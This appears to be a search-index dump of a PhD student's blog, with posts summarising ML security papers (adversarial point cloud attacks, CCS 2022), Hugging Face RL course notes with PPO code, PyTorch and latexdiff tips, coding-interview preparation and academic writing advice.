    "snippet": "Title: On Adversarial Robustness of Point Cloud Semantic Segmentation  Author: Jiacen Xu, Zhe Zhou, Boyuan Feng, Yufei Ding and Zhou Li  Conference: The 53rd Annual IEEE/IFIP International Conferen...",
    "content": "Title: On Adversarial Robustness of Point Cloud Semantic Segmentation  Author: Jiacen Xu, Zhe Zhou, Boyuan Feng, Yufei Ding and Zhou Li  Conference: The 53rd Annual IEEE/IFIP International Conference on Dependable Systems and Network, June, 2023.  Paper: link  Code: https://github.com/C0ldstudy/PointSecGuard  Bibtex: Coming soon.Main IdeaWe present a comparative study of PCSS robustness. First, we formally define the attacker‚Äôs objective under performance degradation and object hiding. Then, we develop new attack by whether to bound the norm. We evaluate different attack options on three datasets and three PCSS models. We found all the models are vulnerable and attacking point color is more effective. With this study, we call the attention of the research community to develop new approaches to harden PCSS models.This is an example that the PCSS model in delivery reobots are misled due to the perturbation in the environment.The workflow of the attack is shown in the following image.Key insight  We develop a holistic framework to enable various attack configurations against PCSS models and extend the previous attacks that are coordinate-based to color-based  We evaluate different attack configurations against three types of PCSS models and indoor and outdoor datasets.Evaluation  Models: PointNet++, ResGCN-28, RandLA-Net  Datasets: S3DIS, Sementic3DThe comparison between color and coordinate attack:Color-based attack on different models:"
  },
  
  {
    "title": "Reinforcement Learning Course from Hugging Face",
    "url": "/posts/Reinforcement_Learning_Course/",
    "categories": "Blogging, RL",
    "tags": "Note",
    "date": "2023-03-11 00:00:00 -0800",
    





    
    "snippet": "I use the blog to record my learning procedures of reinforcement learning course from Hugging FaceUnit 1: Introduction to Deep Reinforcement LearningConcepts:  Reinforcement Learning is a computati...",
    "content": "I use the blog to record my learning procedures of reinforcement learning course from Hugging FaceUnit 1: Introduction to Deep Reinforcement LearningConcepts:  Reinforcement Learning is a computational approach of learning from action. An agent is designed based on the environment interactions with trail and error and receving rewards(+/-) as feedback.  The objective function is to maximize the expected cumulative reward.  The RL process is a sequence of state, action, reward, and next state.  The rewards can be discounted: the early rewards are more probable and predictable then long term future rewards.  The optimal policy is necessary to solve an RL problem which decide the action to take given a state. One example is to maximize the expected return.          Policy-based methods: Training the plicy directly.      Value-based methods: Training the policy by a value function.      Related Glossary:  Markov Property  Observations: Partial description of the state of the environment.  State: Complete description of the state of the world.  Actions: Discrete/Continuous Actions.  Tasks: Episodic/Continuous.Solution:from pyvirtualdisplay import Displayvirtual_display = Display(visible=0, size=(1400, 900))virtual_display.start()import gymfrom huggingface_sb3 import load_from_hub, package_to_hub, push_to_hubfrom huggingface_hub import notebook_login # To log to our Hugging Face account to be able to upload models to the Hub.from stable_baselines3 import PPOfrom stable_baselines3.common.evaluation import evaluate_policyfrom stable_baselines3.common.env_util import make_vec_env# Create the environmentenv = make_vec_env('LunarLander-v2', n_envs=16)# We added some parameters to accelerate the trainingmodel = PPO(    policy = 'MlpPolicy',    env = env,    n_steps = 1024,    batch_size = 64,    n_epochs = 4,    gamma = 0.999,    gae_lambda = 0.98,    ent_coef = 0.01,    verbose=1)# Train it for 1,000,000 timestepsmodel.learn(total_timesteps=1000000, progress_bar=True, log_interval=100000)# Save the modelmodel_name = \"LunarLander-v2\"model.save(model_name)eval_env = gym.make(\"LunarLander-v2\")mean_reward, std_reward = evaluate_policy(model, eval_env, n_eval_episodes=10, deterministic=True)print(f\"mean_reward={mean_reward:.2f} +/- {std_reward}\")import gymfrom stable_baselines3.common.vec_env import DummyVecEnvfrom stable_baselines3.common.env_util import make_vec_envfrom huggingface_sb3 import package_to_hub## repo_id is the id of the model repository from the Hugging Face Hub (repo_id = {organization}/{repo_name} for instance ThomasSimonini/ppo-LunarLander-v2repo_id = \"\" # Need revise# TODO: Define the name of the environmentenv_id = \"LunarLander-v2\"# Create the evaluation enveval_env = DummyVecEnv([lambda: gym.make(env_id)])# TODO: Define the model architecture we usedmodel_architecture = \"PPO\"## TODO: Define the commit messagecommit_message = \"initialization\"# method save, evaluate, generate a model card and record a replay video of your agent before pushing the repo to the hubpackage_to_hub(model=model, # Our trained model               model_name=model_name, # The name of our trained model               model_architecture=model_architecture, # The model architecture we used: in our case PPO               env_id=env_id, # Name of the environment               eval_env=eval_env, # Evaluation Environment               repo_id=repo_id, # id of the model repository from the Hugging Face Hub (repo_id = {organization}/{repo_name} for instance ThomasSimonini/ppo-LunarLander-v2               commit_message=commit_message)# Note: if after running the package_to_hub function and it gives an issue of rebasing, please run the following code# cd &lt;path_to_repo&gt; &amp;&amp; git add . &amp;&amp; git commit -m \"Add message\" &amp;&amp; git pull# And don't forget to do a \"git push\" at the end to push the change to the hub.Unit 2: Introduction to Q-LearningTo solve the RL problems, a policy is required. There are two ways to get it:  Policy-based: training the policy directly.  Value-based: Find an optimal value function.          Most of the time, an Epsilon-Greedy Policy is used to handle the exploration/exploitation trade-off.                  The state-value function.          The action-value function.                    The return valud is the expected return.One way to simplify the value estimation is Bellman Equation. It is similar to Bellman-Ford algorithm to me. The main idea is to calculate the value as the sum of immediate reward plus the discounted value of the state that follows.      Two learning strategies:  Monte Carlo: randomly generate a sequence of state, action, reward‚Ä¶ and calculate the the return at the end of the episode and use it as a target for updating.  Temporal Difference Learning: update the value function from a step.Q-LearningAn off-policy value-based method that uses a Temporal Difference approach to train its action-value function.The epsilon-greedy policy: Instead local optimal action, use epsilon as the possibility to take random action or greedy action.Unit 3: Deep Q-Learning with Atari Games üëæ using RL Baselines3 ZooUse Neural Network to take a state and approximate Q-values.The Deep Q-Network: DQNInput: several frames of gamesOutput: a vector of Q-values for each possible action at that state.The Deep Q AlgorithmIt uses a deep neural network to approximate the different Q-values for each possible action at a state (value-function estimation).It has two phases:  Sampling: Store the observed experience tuples in a replay memory.  Training: Select a small batch of tuples randomly and learn from this batch using a gradient descent update step.One main problem of Deep Q-Learning is instability. There are three solutions:  Experience Replay to make more efficient use of experiences.          Make more efficient use of the experiences during the training.      Avoid forgetting previous experiences and reduce the correlation between experiences.        Fixed Q-Target to stabilize the training.          Use a separate network with fixed parameters for estimating the TD Target.      Copy the parameters from our Deep Q-Network every C steps to update the target network.        Double Deep Q-Learning, to handle the problem of the overestimation of Q-values.          Use the DQN Network to select the best action to take for the next state.      Use the Target network to calculate the target Q-value of taking that action at the next state.      Bonus Unit 2: Automatic Hyperparameter Tuning with OptunaOptuna is a library to search for the best hyperparameters automatically.Unit 4: Policy Gradient with PytorchThe policy-based method:  The idea is to parameterize the policy and maximize the performance of the parameterized policy using gradient ascent.  The policy-gradient method is a subclass of the policy-based method.The advantages and disadvantages of policy-gradient methodsAdv:  The simplicity of integration.  Policy-gradient methods can learn a stochastic policy.  Policy-gradient methods are more effective in high-dimensional action spaces and continuous actions spaces.  Policy-gradient methods ahve better convergence properties.Dis:  It converges to a local maximum instead of a global optimum.  It goes slow: inefficient.  It has high variance.Unit 5: Introduction to Unity ML-AgentsUnity ML-Agent is a toolkit for the game engine Unity to create environments to train the agents.Unit 6: Actor Critic Methods with Robotics EnvironmentsPolicy-gradient methods estimate the weights of the optimal policy using Gradient Ascent which means it chooses the steepest increase in return.Actor-Critic methodsA hybrid architecture combing Value-based and Policy-based methods to stabilize the training by reducing the variance.  An actor to control how the agent behaves.  A critic to measure how good the action is.So there are two function approximations:  A policy that control how our agent acts: $\\pi_\\theta(s)$.  A value function to assist the policy update by measuring how good the action taken is: $q_w(s,a)$Unit 7: Introduction to Multi-Agents And AI vs AIDecentralized approach:  Treat all agents independently without considering the existence of the other agents.  All agents consider others agents as part of the environment.  No guarantee of convergence.Centralized approach:  A single policy is learned from all the agents.  Takes as input the present state of an environment and the policy outputs joint actions.  The reward is global.Unit 8: Proximal Policy Optimization /with DoomProximal Policy Optimization (PPO): An architecture that improves the agent‚Äôs training stability by avoiding large policy updates.Two reasons that we avoid large policy update:  Small update is more likely to converge to an optimal solution.  Big step can result in off the cliff and take a long time to recover.Clipped Surrogate Objective Function\\(L^{CLIP}(\\theta)=E_t[min(r_t(\\theta)A_t, clip(r_t(\\theta), 1-\\epsilon, 1+\\epsilon)A)_t)]\\)where $r_t(\\theta)$ denotes the probability ratio between old and current policy.Bonus Unit 3: Advanced Topics In Reinforcement Learning      Model-based Reinforcement Learning: learning a model of said environment, and then leveraging the model for control (making decisions).        Offline vs Online Reinforcement Learning    Reinforcement Learning from Human Feedback (RLHF): It a¬†methodology for integrating human data labels into a RL-based optimization process. It is motivated by the¬†challenge of modeling human preferences.     - Useful link: https://huggingface.co/blog/rlhf  Decision Transformers: instead of training a policy using RL methods, such as fitting a value function, that will tell us what action to take to maximize the return (cumulative reward),¬†we use a sequence modeling algorithm (Transformer) that, given a desired return, past states, and actions, will generate future actions to achieve this desired return.  Language models in RL:  Curriculum Learning for RL"
  },
  
  {
    "title": "Paper Summary 2023",
    "url": "/posts/Paper_Summary_2023/",
    "categories": "Papers, Reading",
    "tags": "Note",
    "date": "2023-02-01 00:00:00 -0800",
    





    
    "snippet": "1. GPT-GNN: Generative Pre-Training of Graph Neural NetworksPaper/CodeMain IdeaThe paper considers the generative pretrained model (GPT) and combine it with Graph Neural Network (GNN) to introduce ...",
    "content": "1. GPT-GNN: Generative Pre-Training of Graph Neural NetworksPaper/CodeMain IdeaThe paper considers the generative pretrained model (GPT) and combine it with Graph Neural Network (GNN) to introduce a self-supervised attributed graph generation task which is called GPT_GNN. The authors factorize the likelihood of attribute generation and edge generation.Key insight  Leverage GPT to graphs.Experiments  Datasets:          Open Academic Graph      Amazon Review Recommendation Dataset        Baselines:          GAE      GraphSAGE      Graph Infomax      2. Graph UnlearningPaper/CodeMain IdeaThe paper follows the idea from Machine Unlearning to separate a large graph into several small subgraphs and use several local GNN to train and finally use a learning based aggregation to make the final decision.Key insight  Balanced Label Propagation Algorithm:  Balanced Embedding Clustering Method  Learning-based AggregationEvaluationMatrics:  Unlearning Efficiency: Randomly make 100 unlearning request and calculate the average time.  Model Utility: Micro F1 to measure the performance.Experiments:  Evaluation of Unlearning Efficiency  Evaluation of Model Utility  Effectiveness of LBAggr  Comparing with other baselines3.  ADBench: Anomaly Detection BenchmarkPaper/CodeMain IdeaThe paper builds a comprehensive benchmark for tabular anomaly detection which covers three levels of supervision (Unsup, sup, Semi-sup) and considers 57 datasets and 30 algorithms.Key Insight  No benchmarked unsupervised algorithm is better than others: Specific algorithms should be selected for specific datasets.  1% labeled anomalies leads to a better performance for semi-supervised methods compared to the best unsupervised method.  By preprocessing the data with carefully controlling,  the best unsupervised methods https://www.ndss-symposium.org/ndss-paper/doitrust-dissecting-on-chain-compromised-internet-domains-via-graph-learning/for specific types of anomalies are better than semi- and fully-supervised methods: understanding the data characteristics is important.  Semi-supervised methods show potential to be robust on noisy and corrupted data.4. DoItrust: Dissecting On-chain Compromised Internet Domains via Graph LearningPaper/Main IdeaThe paper combines MLP for node features, GNN for topology information together to make suspicion prediction by global propagation and then designs pruning strategies to remove suspicious nodes.Key Insight  Define an expansion graph which creates organically grown Internet domain all-lists based on trust transitivity.  Design a semi-supervised suspicion prediction scheme to predict the relation of a node with the targets of compromise.          Design a new ranking algorithm based on PageRank to combine both global information and the local topology.        After that, use pruning strategies to remove highly suspicious nodes. There are two strategies.          Shortest path-based pruning      Flow-based pruning      5. Stochastic Optimization of Areas Under Precision-Recall Curves with Provable ConvergencePaper/CodeMain IdeaThe paper designes a specific loss funcation and optimizer on Average Precision (AP) / Areas under precision-recall curves (AUPRC). The optimization method has convergence guarantee.Key Insight  Formalize the loss function by approximation.  Design the stochastic optimization of AP by approximation.ProvementStep 1: (First approximation: AUPRC-&gt; AP)The AUPRC is an average of the precision weighted by the probability of a given threshold. In that case, for a finite set of test dataset $D={(x_i, y_i), i=1,\\dots ,n}$ and the prediction score $h_w(x_i)$ of $x_i$, the AP (average prevision) can approximate AUPRC as the following equation:\\[AP = \\frac{1}{n_+}\\sum_{i=1}^n I(y_i=1)\\frac{\\sum_{s=1}^nI(y_s=1)I(h_w(x_s)\\geq h_w(x_i))}{\\sum_{s=1}^nI(h_w(x_s)\\geq h_w(x_i))}\\]$I(\\cdot)$ is 1 if the input discriminant is true and 0 if it is false.Step 2:(Second approximation: loss function)The non-continuous indicator function $I(h_w(x_s)\\geq h_w(x_i))$ is non-tractable, so a surrogate loss function is necessary to facilitate the optimization algorithm. In the paper, squared hinge loss is used:\\(l(w;x_s;x_i)= (max\\{m-(h_w(x_i)-h_w(x_s)), 0\\})^2\\)where $m$ is a margin paramter. In that case, the optimization problem becomes:\\(\\min_wP(w)= \\frac{1}{n_+}\\sum_{x_i\\in D_+}\\frac{-\\sum_{s=1}^nI(y_s=1)l(w;x_s;x_i)}{\\sum_{s=1}^nl(w;x_s;x_i)}\\)Step 3: (Formalize the objective function)Define:\\(g(w;x_j,x_i)=[g_1(w;x_j,x_i),g_2(w;x_j,x_i)]^T=[I(y_s=1)l(w;x_s;x_i), l(w;x_s;x_i)]^T\\)\\(g_{x_i}(w)=E_{x_j\\sim D}[g(w;x_j,x_i)]\\)where $g_{x_i}(w): R^d\\rightarrow R^2$ and $f(s)=-\\frac{s_1}{s_2}:R^2\\rightarrow R$. And then rewrite the $P(w)$ by $g(w;x_j,x_i)$ and $f(s)$.\\(P(w)=\\frac{1}{n_+}\\sum_{x_i\\in D_+}f(g_{x_i}(w))=E_{x_i\\sim D_+}[f(g_{x_i}(w)]\\)This function is  an instance of two-level stochastic dependent compositional functions.Step 4: (Calculate the gradient)Let the gradient of $g_{x_i}(w)$ be denoted by $\\nabla_wg_{x_i}(w)^T=(\\nabla_w[g_{x_i}(w)]1, \\nabla_w[g{x_i}(w)]_2)$.\\(\\begin{align*}\\nabla_w P(w)=\\frac{1}{n_+}\\sum_{x_i\\in D_+}\\nabla_wg_{x_i}(w)^T\\nabla f(g_{x_i}(w)) = \\\\\\frac{1}{n_+}\\sum_{x_i\\in D_+} \\nabla_wg_{x_i}(w)^T(\\frac{-1}{[g_{x_i}(w)]_2},\\frac{[g_{x_i}(w)]_1}{([g_{x_i}(w)]_2)^2})^2\\end{align*}\\)And then use stochastic samplesw to approximate the quantities.6. How to Cover up Anomalous Accesses to Electronic Health RecordsPaperMain IdeaThe paper analyzes the electronic health record (EHR) system by two adversarial attacks (evasion attack and poisoning attack). It shows that the evasion attack is effective while the poisoning attack fails.Key Insight  The main difference with the previous works is the way to define the successful attack: all the injected covering accesses are stealthy to the model.  It tries white-box, gray-box on evasion attack.7. SecureFL: Privacy Preserving Federated Learning with SGX and TrustZonePaper/8. PPFL: Privacy-preserving Federated Learning with Trusted Execution EnvironmentsPaper/Code"
  },
  
  {
    "title": "Tricks Summary 2023",
    "url": "/posts/Tricks_Summary_2023/",
    "categories": "PhD",
    "tags": "",
    "date": "2023-01-29 00:00:00 -0800",
    





    
    "snippet": "1. Pytorch ReproducibilityThere is a official page talking about the logic of the reproducibility of PyTorch.Basically, the following snippet support the reproducibility:import numpy as npimport ra...",
    "content": "1. Pytorch ReproducibilityThere is a official page talking about the logic of the reproducibility of PyTorch.Basically, the following snippet support the reproducibility:import numpy as npimport randomimport torchseed = 0random.seed(seed) # python random generatornp.random.seed(seed) # numpy random generatortorch.manual_seed(seed)torch.cuda.manual_seed_all(seed)torch.backends.cudnn.deterministic = Truetorch.backends.cudnn.benchmark = Falsetorch.use_deterministic_algorithms(True) # check nondeterministic algorithmsBasically, the CUP version is easier to get reproductive results while GPU reproductibility is not certain.2. Use latexdiff on MacMac OS already has perl so only the latexdiff needs to be installed.The eastiest way to install latexdiff is by homebrew:brew install latexdiffbrew upgrade latexdiffbrew uninstall latexdiffAnd use the commend to generate diff.tex:latexdiff old.tex new.tex --flatten &gt; diff.texUseful link:  https://shannonmlocke.wordpress.com/2020/05/10/a-short-guide-to-using-latexdiff/3. How to check memory leakage in pytorchUseful link.Common causes:  If I create an array that holds tensors and continually add tensors to the array, it will fill up the memory.  If I compute something from tensors but do not get backpropogation, these tensors will not be cleared and keep growing.          The issue can be solved by adding .detach() to any tensor that does not need to be involved in training.      Conclusions:  torch.cuda.empty_cache() is just a bandaid which delay the out of the memory issue instead of solving it.  Use torch.cuda.memory_allocated() and torch.cuda.max_memory_allocated() to print the percentage of used memory at the top of the training loop.4. How to use latexdiff on MacUse the following commands to install latexdiff and texlive.brew install latexdiffbrew install texliveRun the simple bash script. Or try this one if necessary: repo. Be careful about the table comparison since there is a bug in latexdiff. Recommand to use a separate file to avoid table comparison.# latexdiff.sh#!/bin/bashlatex_file_modify=(\"main.tex\" \"appendix.tex\")latex_file_origin=(\"main.tex\" \"appendix.tex\")latex_file_num=2origin_dir=\"$1\"modify_dir=\"$2\"diff_dir=\"$3\"for((i=0;i&lt;${latex_file_num};i++));docp \"${origin_dir}/${latex_file_origin[${i}]}\" \"${diff_dir}/origin_${latex_file_origin[${i}]}\"cp \"${modify_dir}/${latex_file_modify[${i}]}\" \"${diff_dir}/modify_${latex_file_modify[${i}]}\"rm \"${diff_dir}/${latex_file_modify[${i}]}\"cd \"${diff_dir}\"latexdiff -t UNDERLINE \"origin_${latex_file_origin[${i}]}\" \"modify_${latex_file_modify[${i}]}\" &gt; \"${latex_file_modify[${i}]}\"rm \"origin_${latex_file_origin[${i}]}\"rm \"modify_${latex_file_modify[${i}]}\"cd ..doneFinally, use the ./latexdiff.sh &lt;origin_dir&gt; &lt;modify_dir&gt; &lt;diff_dir&gt; to generate the diff tex files and upload to overleaf to see the results.  Notice that the tex files should be under the root folder instead of multi-level folders."
  },
  
  {
    "title": "Coding Interview",
    "url": "/posts/Coding_Interview/",
    "categories": "Summary",
    "tags": "PhD",
    "date": "2022-12-14 00:00:00 -0800",
    





    
    "snippet": "Interview Preparation1. Top 10 mistakes  Practicing on a computer: Use pen and paper  Not rehearsing Behavioral Questions  Not doing a mock interview  Trying to Memorize Solutions  Not soluving pro...",
    "content": "Interview Preparation1. Top 10 mistakes  Practicing on a computer: Use pen and paper  Not rehearsing Behavioral Questions  Not doing a mock interview  Trying to Memorize Solutions  Not soluving problems out loud  Rushing  Sloppy Coding: imagine you are writing for real-world maintainability  Not Testing  Fixing Mistakes Carelessly  Giving up2. Behavioral PreparationThink about the question: Tell me about a time when you ....            Common Questions      Project      Projct                  Most Challenging      ¬†      ¬†              What you learned      ¬†      ¬†              Most Interesting      ¬†      ¬†              Hardest Bug      ¬†      ¬†              Enjoyed Most      ¬†      ¬†              Conflicts with Teammates      ¬†      ¬†      2.1 Questions for the interviewerGeneral:  How much of your day do you spend coding?  How many meetings do you have every week?  What is the ratio of testers to developers to program managers? What is the interaction like? How does project planning happen on the team?Insightful:  I noticed that you use technology X. How do you handle problem Y?  Why did the product choose to use the X protocol over the Y protocol? I know it has benefits like A, B, C, but many companies choose not to use it because of issue D.Passion:  I am very interested in scalability. Did you come in with a background  in this, or what opportunities are there to learn about it?  I am not familiar with technology X, but it sounds like a very interesting solution. Can you tell me a bit more about how it works?3. Technical QuestionHow to practice a Question?  Try to solve the problem on your own.  Write the code for the algorithm on paper.  Test your code on paper: general cases, base cases, error cases, and so on.  Type your paper code as-is into  a computer: start a list of all the errors you make to keep these in mind in the real interview.3.1 Must-have Knowledge            Data structure      Algorithms      Concepts                  Linked Lists      breadth First Search      Bit Manipulation              Binary Trees      Depth First Search      Singleton Design Pattern              Tries      Binary Search      Factory Design Pattern              Stacks      Merge Sort      Memory (Stack vs Heap)              Queues      Quick Sort      Recursion              Vectors/ArrayLists      Tree Insert/Find/e.t.c.      Big-O Time              Hash Table      ¬†      ¬†      Make sure you understand how to use and implement them and, where applicable, what the space and time complexity is.For the data structure and algorithms, be sure to practice implementing them from scratch.Hash tables are important.3.2 Five Steps to a Technical Question  Ask your interviewer questions to resolve ambiguity: data types, data range, assumptions, who is the user?  Design an Algorithm          what is the space and time complexity?      What if there is a lot of data?      Does it cause other issues?      If there are other issues or limitations, did you make the right trade-offs?      If they gave specific data, have you leveraged that information? Usually there is a rason to give specific information.        Pseudocode  Code          Use data structures generously      Don‚Äôt crowd your coding: start fromt he upper left hand corner of a whiteboard.        Test:          Extreme cases: 0, negative,  null, maximums, minimums      User error: if user passes in null or a negative value?      General cases      3.3 Five Main Algorithm Approaches  Examplify  Pattern Matching: try to modify the solution to a related problem to develop an algorithm.  Simplify and Genearlize  Base case and Build  Data Structure Brainstorm: Linked list, Array, Binary tree, Heap, Dictionary‚Ä¶3.4 Good Code Properties  Correct  Efficient  Simple  Readable  Maintainable4. Interview Questions4.1 Data Structures  Arrays and Strings          Hash Tables: map keys to values for highly efficient lookup.                  ‚ùóÔ∏èpractice both implementing and using hash table.                    ArrayList (Dynamically Resizing Array)      StringBuffer        Linked Lists          Creating a Linked List      Deleting a Node from a Singly Linked List      The Runner Technique      Recursive Problems        Stacks and Queues          Implementing a Stack      Implementing a Queue        Trees and Graphs          ‚ùóÔ∏èPotential Issues to Watch Out For                  Binary Tree vs Binary Search Tree          Balanced vs Unbalanced          Full and Complete                    Binary Tree Traversal                  in-order/post-order/pre-order traversal                    Tree Balancing: Red-Black Trees and AVL Trees      Tries      Graph Traversal                  Depth First Search          Breadth First Search                    4.2 Concepts and Algorithms4.2.1 Bit Manipulation\t- Bit Manipulation by Hand\t- Bit facts and Tricks\t- Common Bit Tasks: Get, Set, Clear, and Update Bit4.2.2 Brain Teasers\t- Start Talking\t- Develop Rules and Patterns\t- Worst Case Shifting\t- Algorithm Approaches: Consider 5 methods from 3.34.2.3 Mathematics and Probability\t- Prime Numbers\t\t- Divisibility\t\t- Checking for Primality\t\t- Generating a List of Primes: The Sieve of Eratosthenes\t- Probability\t\t- A and B\t\t- A or B\t\t- Independence\t\t- Mutual Exclusivity4.2.4 Object-Oriented Design  How to approach Object-Oriented Design Questions          Step 1: Handle Ambiguity (Some descriptiones are vague which need to make clear)      Step 2: Define the Core Objects      Step 3: Analyze Relationships      Step 4: Investigate Actions        Design Patterns          Singleton Class: a class can have only one instance.      Factory Method: an interface to create an instance of a class.      4.2.5 Recursion and Dynamic Programming  How to Approach          Bottom-Up Recursion      Top-Down Recursion        Dynamic Programming          A simple example: Fibonacci Number        Recursive vs. Iterative Solutions4.2.6 Scalability and Memory Limits  The Step-By-Step Approach          Step 1: Make believe                  Assuem the data can fit on one machine without limitations.                    Step 2: Get Real      Step 3: Solve Problems        What do you need to know: Information, Strategies and Issues          Dividing up lost of data                  by order of appearance          by hash value          by actual value          arbitrarily                    4.2.7 Sorting and Searching  Common Sorting Algorithms          Bubble Sort                  Runtime: average O ($n^2$) and worst case.          Memory: O (1).                    Selection Sort                  Runtime: average O ($n^2$) and worst case.          Memory: O (1).                    Merge Sort                  Runtime: average O ($n\\cdot Log(n)$) and worst case.          Memory: depends.                    Quick Sort                  Runtime: average O ($n\\cdot Log(n)$) and worst case O ($n^2$)          Memory: O ($Log(n)$)                    Radix Sort                  Runtime: average O($k\\cdot n$)                    4.2.8 Testing  What the interviewer is looking for?          Big picture understanding      Knowing how the pieces fit together      Organization      Practicality        Testing a Real World Object          Step 1: Who will use it? And why?      Step 2: What are the use cases?      Step 3: What are the bounds of use?      Step 4: What are the stress/ failure conditions?      Step 5: How would you perform the testing?        Testing a piece of Software          Manual vs. Automated Testing      Balck Box Testing vs. White Box Testing      Step 1: Are we doing Balck Box Testing or White Box Testing?      Step 2: Who will use it? And why?      Step 3: What are the use cases?      Step 4: What are the bounds of use?      Step 5: What are the stress conditions/failure conditions?      Step 6: What are the test cases? How would you perform the testing?        Testing a Function          Step 1: Define the test cases                  the normal case          the extremes          Nulls and ‚Äúillegal‚Äù input          Strange input                    Step 2: Define the expected result      Step 3: Write test code        Troubleshooting Questions          Step 1: Understand the Scenario      Step 2: Break Down the Problem      Step 3: Create Specific, Manageable Tests      Reference  Cracking the Coding Interview: 150 Programming Questions and Solutions"
  },
  
  {
    "title": "CCS 20222 Summary",
    "url": "/posts/CCS2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-11-01 00:00:00 -0700",
    





    
    "snippet": "Paper List:  1D: Poisoning and Backdooring ML          Identifying a Training-Set Attack‚Äôs Target Using Renormalized Influence Estimation      ‚ùìFenceSitter: Black-box, Content-Agnostic, and Synchro...",
    "content": "Paper List:  1D: Poisoning and Backdooring ML          Identifying a Training-Set Attack‚Äôs Target Using Renormalized Influence Estimation      ‚ùìFenceSitter: Black-box, Content-Agnostic, and Synchronization-Free Enrollment-Phase Attacks on Speaker Recognition Systems      Truth Serum: Poisoning Machine Learning Models to Reveal Their Secrets      LoneNeuron: a Highly-effective Feature-domain Neural Trojan using Invisible and Polymorphic Watermarks        2G&amp;3A: Inference Attacks to ML MI attack explanation          Group Property Inference Attacks Against Graph Neural Networks      Are Attribute Inference Attacks Just Imputation?      Enhanced Membership Inference Attacks against Machine Learning Models      Membership Inference Attacks and Generalization: A Causal Perspective        3F: ‚≠ïÔ∏èFederated Learning Security          Eluding Secure Aggregation in Federated Learning via Model Inconsistency      EIFFeL: Ensuring Integrity for Federated Learning      pMPL: A Robust Multi-Party Learning Framework with a Privileged Party      Private and Reliable Neural Network Inference        4D: Attacks to ML          Physical Hijacking Attacks against Object Trackers      Feature Inference Attack on Shapley Values      When Evil Calls : Targeted Adversarial Voice over IP-Telephony Network      Order-Disorder: Imitation Adversarial Attacks for Black-box Neural Ranking Models        4I&amp;5B: Adversarial Examples in ML          Perception-Aware Attack: Creating Adversarial Music via Reverse-Engineering Human Perception      '‚ÄôIs your explanation stable?‚Äô‚Äô: A Robustness Evaluation Framework for Feature Attribution      Post-breach Recovery: Protection against White-box Adversarial Examples for Leaked DNN Models      Harnessing Perceptual Adversarial Patches for Crowd Counting        5G&amp;6A&amp;6G: Priv &amp; Anon: Privacy Attacks in ML          SSLGuard: A Watermarking Scheme for Self-supervised Learning Pre-trained Encoders      Auditing Membership Leakages of Multi-Exit Networks      StolenEncoder: Stealing Pre-trained Encoders      Membership Inference Attacks by Exploiting Loss Trajectory      DPIS: an Enhanced Mechanism for Differentially Private SGD with Importance Sampling      NFGen: Automatic Non-linear Function Evaluation Code Generator for General-purpose MPC Platforms      On the Privacy Risks of Cell-Based NAS Architectures      LPGNet: Link Private Graph Networks for Node Classification        7J&amp;8C: Differential Privacy          Shifted Inverse: A General Mechanism for Monotonic Functions under User Differential Privacy      Frequency Estimation in the Shuffle Model with Almost a Single Message      Differentially Private Triangle and 4-Cycle Counting in the Shuffle Model      Widespread Underestimation of Sensitivity in Differentially Private Libraries and How to Fix It        8H: Privacy in Graphs          Graph Unlearning      Finding MNEMON: Reviving Memories of Node Embeddings      Identifying a Training-Set Attack‚Äôs Target Using Renormalized Influence EstimationThe paper buildan influence estimation to quantify the training data points‚Äô contribution to a model‚Äôs prediction. They test on backdoor and poisoning attacks across various data domains like text, vision, and speech.‚ùáÔ∏èTruth Serum: Poisoning Machine Learning Models to Reveal Their SecretsAuthor: Reza Shokri (NUS), Nicholas Carlini(Google)The paper provides a poisoning attack to lead other users‚Äô data privacy by membership inference, attribute inference, and data extraction.LoneNeuron: a Highly-effective Feature-domain Neural Trojan using Invisible and Polymorphic WatermarksThe paper designs a new model-poisoning attack that revise both the model structure and data points to add invisible, sample-specific, and polymorphic pixel-domain watermarks.‚ùáÔ∏èGroup Property Inference Attacks Against Graph Neural NetworksThe paper summarizes the previous methods and design a black-box attacka and a white-box attack for property inference. They use GCN, Graphsage, and GAT as tearget models on three datasets: Pokec, Facebook, and Pubmed.The baselines look pretty simple.Privacy related?Are Attribute Inference Attacks Just Imputation?To understand attribute inference risks, the paper proposes a white-box attack that identifies neurons in a model that are most correlated with the sensitive value for a target attribute.Enhanced Membership Inference Attacks against Machine Learning ModelsAuthor: Reza Shokri (NUS)The paper proposes a hypothesis testing framework that use reference models to get better performance. They also make explanations and differential analysis about the attacks and what causes data points to be vulnerable.The paper is quite theoritical.Membership Inference Attacks and Generalization: A Causal PerspectiveAuthor: Prateek Saxena (NUS)The paper designs a causal graph to explain the influence of 6 attack variants."
  },
  
  {
    "title": "Academic Writing",
    "url": "/posts/Writing/",
    "categories": "",
    "tags": "PhD",
    "date": "2022-10-02 00:00:00 -0700",
    





    
    "snippet": "In this blog, I would like to talk about my summary about how to write a good paper or rebuttal in academia.Paper Writing  Determining the big picture:          Build the scaffolding before filling...",
    "content": "In this blog, I would like to talk about my summary about how to write a good paper or rebuttal in academia.Paper Writing  Determining the big picture:          Build the scaffolding before filling in the details. Write sections and topic setences first.                  Start at a high level by outlining sections.                    Assess balance and budget pages accordingly.      Follow the convention from other research papers like the paper structure.      Signpost your paper.                  Examples of signposts include: an outline of the paper at the end of the introduction (‚ÄúThe rest of this paper proceeds as follows.‚Äù), a preamble to each section (‚ÄúIn this section, we discuss‚Ä¶‚Äù), declarative subsection titles, and (within reason) bold paragraph headings (such as those in this blog post).                      Use figures and plots to support your text:          Keep figures as clean and simple as possible.                  Lines should not cross one another.          Fonts should be roughly the same size as the font size in the paper itself.          The use of ink should be minimized (no unnecessary shading, backgrounds or colors)                    Each plot should have exactly one technical point.                  Using different colors to show different methods when comparing them.                      Make a good impression:          Spend a lot of time on your introduction: start early.                  The introduction summarizes the story of your paper.                    Write the introduction first and last.                  Early to think about the following questions in the first round of introduction:                          What is the problem?              Why is it hard?              Why will the solution be interesting to readers if it is achieved?                                Check each claim in the introduction is supported by the results and data in the second round.                    Perform some ‚Äúlandscaping‚Äù on your paper.                  Place (and create) signposts, figures, and graphs to create whitespace and avoid ‚Äúwalls of text‚Äù.          Check your spelling.          Make the last page look decent.          Eliminate widows and dangling text.                          widows on paragraphs: paragraphs that end with a single word on the last line.                                            Be efficient:          Tailor the length of your paper to the information content.                  Remember the goal is to efficiently transfer information.                    Keep words simple and sentences short.                  Omit needless words.                    Eliminate redundancy.      Be as specific and precise as you can.      Use clear and consistent terminology.      Some questions that the reviewers care:  What is the main novelty?  How is the method proposed in the paper compared to existing works?  Compared with esisting works, what aspect does the paper 